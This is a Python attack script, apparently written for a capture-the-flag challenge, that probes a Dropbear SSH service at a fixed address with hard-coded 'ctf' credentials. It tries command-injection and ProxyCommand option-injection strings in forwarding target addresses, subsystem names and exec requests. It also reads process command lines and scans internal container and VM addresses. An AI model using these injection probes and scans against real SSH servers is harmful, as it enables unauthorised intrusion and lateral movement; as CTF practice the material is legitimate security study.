import paramiko
import socket
import time
import sys
import subprocess
import os

HOST = "61.147.171.105"
PORT = 55300
USER = "ctf"
PASSWD = "123456"

def exec_cmd(ssh, cmd, timeout=10):
    """执行命令并返回输出"""
    stdin, stdout, stderr = ssh.exec_command(cmd, timeout=timeout)
    out = stdout.read().decode()
    err = stderr.read().decode()
    return out + err

def test_stdio_forward_escape():
    """
    FakeJumpServer攻击的核心：
    当使用 ssh -J 或 ssh -W 时，跳板机的SSH服务器会被要求建立一个TCP转发
    
    Dropbear处理这个请求时，可能会：
    1. 直接打开一个socket连接
    2. 或者执行某个命令（如 ssh -W）来建立转发
    
    如果是后者，且我们能控制目标地址，就可能注入命令
    """
    
    # 检查dropbear的行为
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    # 尝试各种特殊的目标地址
    # dropbear可能会将这些传递给某个shell命令
    test_targets = [
        # 正常地址
        ("localhost", 22),
        # 命令注入尝试
        ("localhost;id", 22),
        ("localhost`id`", 22),
        ("localhost$(id)", 22),
        ("127.0.0.1;id", 22),
        # 特殊字符
        ("localhost\nid", 22),
        ("localhost\x00id", 22),
        # 选项注入
        ("-oProxyCommand=id localhost", 22),
        ("localhost -oProxyCommand=id", 22),
    ]
    
    for host, port in test_targets:
        try:
            print(f"[*] 尝试: {repr(host)}:{port}")
            channel = transport.open_channel("direct-tcpip", (host, port), ('127.0.0.1', 0), timeout=3)
            print(f"[+] 通道打开成功")
            channel.settimeout(2)
            try:
                data = channel.recv(100)
                print(f"    Data: {data}")
            except:
                pass
            channel.close()
        except Exception as e:
            print(f"[-] 失败: {e}")
    
    ssh.close()

def test_subsystem_injection():
    """测试子系统注入"""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    # 尝试请求不同的子系统
    # 某些SSH服务器可能会执行命令来处理子系统请求
    subsystems = [
        "sftp",
        "scp",
        "id",
        "/bin/sh",
        "$(id)",
        "`id`",
    ]
    
    for sub in subsystems:
        try:
            print(f"[*] 请求子系统: {repr(sub)}")
            channel = transport.open_session()
            channel.invoke_subsystem(sub)
            print(f"[+] 子系统请求成功")
            channel.settimeout(2)
            try:
                data = channel.recv(1024)
                print(f"    Response: {data}")
            except:
                pass
            channel.close()
        except Exception as e:
            print(f"[-] 失败: {e}")
    
    ssh.close()

def test_exec_injection():
    """测试exec命令注入"""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    # 测试各种命令
    commands = [
        "id",
        "echo test",
        # 尝试shell逃逸
        ";id",
        "|id",
        "`id`",
        "$(id)",
        # 检查环境
        "printenv",
        "cat /proc/self/cmdline",
    ]
    
    for cmd in commands:
        print(f"\n[*] 执行: {repr(cmd)}")
        try:
            result = exec_cmd(ssh, cmd)
            print(result[:500] if result else "(no output)")
        except Exception as e:
            print(f"[-] 错误: {e}")
    
    ssh.close()

def analyze_architecture():
    """分析架构 - 理解SSH如何处理转发"""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    print("[*] 分析SSH服务架构...")
    
    # 1. 检查是否有多层SSH
    print("\n[*] 检查网络连接...")
    print(exec_cmd(ssh, "netstat -an"))
    
    # 2. 检查进程
    print("\n[*] 检查进程...")
    print(exec_cmd(ssh, "ps"))
    
    # 3. 检查这个shell是如何被启动的
    print("\n[*] 检查shell启动方式...")
    print(exec_cmd(ssh, "cat /proc/self/cmdline"))
    print(exec_cmd(ssh, "cat /proc/$$/cmdline"))
    
    # 4. 检查父进程
    print("\n[*] 检查父进程...")
    print(exec_cmd(ssh, "cat /proc/$PPID/cmdline"))
    
    ssh.close()

def test_channel_forward_paths():
    """测试不同的通道转发路径"""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 测试direct-tcpip到不同目标...")
    
    # 测试连接到不同网段的主机
    # 如果dropbear使用外部命令来建立这些连接，可能会有注入机会
    targets = [
        # 容器网络
        ("172.17.0.1", 22),
        ("172.17.0.2", 80),
        ("172.17.0.3", 22),
        # 本地
        ("localhost", 22),
        ("127.0.0.1", 22),
        # QEMU网络
        ("10.0.2.2", 22),
        ("10.0.2.15", 22),
        # 其他
        ("host.docker.internal", 22),
    ]
    
    for host, port in targets:
        try:
            channel = transport.open_channel("direct-tcpip", (host, port), ('127.0.0.1', 0), timeout=3)
            print(f"[+] {host}:{port} - 连接成功")
            channel.settimeout(2)
            try:
                banner = channel.recv(100)
                print(f"    Banner: {banner[:60]}")
            except:
                pass
            channel.close()
        except Exception as e:
            print(f"[-] {host}:{port} - {e}")
    
    ssh.close()

if __name__ == "__main__":
    print("="*50)
    print("[*] FakeJumpServer风格攻击测试")
    print("="*50)
    
    print("\n[1] 分析架构")
    analyze_architecture()
    
    print("\n[2] 测试通道转发路径")
    test_channel_forward_paths()
    
    print("\n[3] 测试子系统注入")
    test_subsystem_injection()
